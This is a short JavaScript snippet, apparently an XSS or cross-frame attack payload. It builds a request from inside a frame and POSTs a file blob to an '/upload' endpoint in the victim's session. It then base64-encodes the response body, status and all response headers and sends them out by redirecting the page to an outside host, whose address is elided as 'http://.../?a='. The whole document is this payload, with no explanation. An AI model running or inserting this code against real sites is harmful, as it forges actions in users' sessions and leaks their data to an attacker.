var xhr = new frames[0].XMLHttpRequest;
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    var result = xhr.responseText;
    result += ",";
    result += xhr.status;
    result += ",";
    result += xhr.getAllResponseHeaders();
    window.location="http://.../?a=" + btoa(result);
  }
}

xhr.open('POST', '/upload', true);

var fblob = new Blob(["any content here"]);
var formData = new FormData();
formData.append("file", fblob);

xhr.send(formData);